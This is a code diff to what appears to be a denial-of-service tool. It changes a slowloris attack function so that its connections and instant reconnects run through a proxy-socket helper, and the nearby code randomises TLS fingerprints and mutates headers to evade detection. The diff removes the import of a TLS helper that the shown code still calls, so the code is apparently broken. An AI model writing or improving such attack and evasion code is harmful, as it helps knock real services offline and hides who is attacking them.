@@ -11,7 +11,13 @@ from typing import Optional, List, Dict, Tuple
 from urllib.parse import urlparse, urlencode
 from core.attack.strategies.adaptive import AdaptiveController
 from core.monitor.metrics import MetricsCollector
-from core.network.tls_fingerprint import get_random_ssl_context
+try:
+    from core.network.socks_utils import create_proxied_socket
+except ImportError:
+    def create_proxied_socket(proxy_url="", timeout=10):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        return sock
 from core.network.header_mutation import get_mutated_headers
 
 logger = logging.getLogger("enhanced_attack")
@@ -804,9 +810,8 @@ async def attack_slowloris_raw(url: str, proxy: Optional[str], session_pool: Opt
     def _connect_one():
         """Synchronous connect helper - runs in thread pool for true parallelism"""
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock = create_proxied_socket(proxy or "", 4)
             _configure_socket(sock)
-            sock.settimeout(4)
             sock.connect((host, port))
             if is_ssl:
                 context, _tls_profile = get_random_ssl_context()
@@ -867,9 +872,8 @@ async def attack_slowloris_raw(url: str, proxy: Optional[str], session_pool: Opt
                     continue
                 # Instant failover: reconnect immediately
                 try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    _configure_socket(sock)  # Apply minimal buffers
-                    sock.settimeout(4)
+                    sock = create_proxied_socket(proxy or "", 4)
+                    _configure_socket(sock)
                     sock.connect((host, port))
                     if is_ssl:
                         ctx, tls_profile = get_random_ssl_context()
